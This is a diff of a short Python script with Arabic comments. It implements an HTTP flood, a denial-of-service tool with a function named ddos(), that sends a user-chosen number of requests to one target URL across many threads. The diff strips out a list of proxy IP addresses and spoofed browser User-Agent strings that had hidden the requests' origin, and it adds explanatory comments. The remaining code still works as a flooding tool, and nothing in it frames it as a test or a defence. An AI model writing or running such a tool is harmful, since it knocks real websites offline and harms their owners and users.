@@ -1,23 +1,8 @@
 import requests
 import threading
-import random
 from queue import Queue
 
-# إعداد قائمة بالوكلاء (Proxies) ورؤوس المستخدم (User-Agents)
-proxies = [
-    "http://51.79.50.22:9300",
-    "http://185.199.229.156:7492",
-    "http://45.76.115.156:8080",
-    # أضف المزيد من الوكلاء هنا
-]
-
-user_agents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
-    # أضف المزيد من وكلاء المستخدم هنا
-]
-
+# قائمة المهام (URLs)
 urls = Queue()
 
 def ddos():
@@ -27,11 +12,9 @@ def ddos():
     while not urls.empty():
         url = urls.get()
         try:
-            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)}
-            headers = {"User-Agent": random.choice(user_agents)}
-            requests.get(url, headers=headers, proxies=proxy, timeout=5)
+            requests.get(url, timeout=5)  # إرسال الطلب
         except requests.exceptions.RequestException:
-            pass
+            pass  # تجاهل الأخطاء لضمان الاستمرارية
         urls.task_done()
 
 def main():
@@ -45,16 +28,19 @@ def main():
     if thread_count <= 0 or request_count <= 0:
         return  # إنهاء البرنامج إذا كانت القيم غير صحيحة
 
+    # إضافة الهدف إلى قائمة الطلبات
     for _ in range(request_count):
         urls.put(target)
 
     threads = []
 
+    # إنشاء وتشغيل الخيوط
     for _ in range(thread_count):
         thread = threading.Thread(target=ddos)
         threads.append(thread)
         thread.start()
 
+    # انتظار انتهاء جميع الخيوط
     for thread in threads:
         thread.join()
 
